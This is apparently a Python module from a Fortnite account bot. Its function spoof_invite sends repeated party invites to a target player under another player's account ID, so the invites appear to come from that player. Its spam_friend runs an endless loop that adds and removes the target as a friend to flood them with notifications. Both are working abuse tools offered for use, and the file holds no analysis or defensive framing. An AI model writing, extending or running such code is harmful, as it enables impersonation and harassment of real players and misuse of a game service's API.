import requests
from eon_bot.auth.client import BASE
from eon_bot.friends.search import search_accounts
from eon_bot.friends.add import add_friend
from eon_bot.friends.remove import remove_friend


def spoof_invite(client, sender: str, target: str, amount: int = 1):

    sender_matches = search_accounts(client, sender)
    if not sender_matches:
        raise ValueError(f"no account found for sender {sender!r}")
    
    target_matches = search_accounts(client, target)
    if not target_matches:
        raise ValueError(f"no account found for target {target!r}")
    
    sender_id = sender_matches[0]["accountId"]
    target_id = target_matches[0]["accountId"]

    for _ in range(amount):
        resp = requests.post(
            f"{BASE}/party/api/v1/Fortnite/user/{target_id}/pings/{sender_id}",
            headers=client._auth_header(),
            json={
                "urn:epic:invite:platformdata_s": "",
                "urn:epic:conn:platform_s": "WIN",
            },
        )
        resp.raise_for_status()
    return resp.json()

def spam_friend(client, target_account_id: str):
    while True:
        add_friend(client, target_account_id)
        remove_friend(client, target_account_id)